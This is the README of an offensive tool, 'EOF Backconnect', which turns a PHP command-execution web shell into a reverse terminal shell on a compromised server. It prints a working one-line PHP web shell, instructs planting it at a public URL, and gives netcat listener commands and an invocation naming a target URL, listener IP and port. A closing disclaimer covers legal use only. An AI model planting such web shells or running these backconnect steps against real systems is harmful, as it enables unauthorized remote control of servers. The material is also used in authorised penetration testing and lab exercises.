#EOF Backconnect
A simple script to perform various methods to gain a terminal shell from a simple PHP shell.

##Introduction
After gaining a command execution shell on a server, this script will help leverage that into a backconnected terminal shell using various payloads.

#####Example PHP Shell:
```
<?php system($_GET['cmd']); ?>
```

##Usage
1. Install the command execution shell so it is publically accesible via a URL.
2. Set up a listener to receive the incoming connection.
	- `nc -nvlp {PORT}`
	- `nc -nvlp {PORT} -s {HOST}`
3. Run this script.

##How to use

```
./eof-backconnect.py [-u URL] [-i IP] [-p PORT]
```
#####URL
This is the URL of the command execution shell, including the necessary injection parameter.

#####IP
This is the listener IP for the remote server to backconnect to.

#####PORT
This is the listener port for the target server to backconnect over.

####Example:
```
./eof-backconnect.py -u http://example.com/cmd.php?cmd= -i 10.10.15.96 -p 1337
```

##Disclaimer
Usage of this tool for attacking targets without prior mutual consent
is illegal. It is the end user's responsibility to obey all applicable local, state and
federal laws. Developers assume no liability and are not responsible for any misuse or
damage caused by this program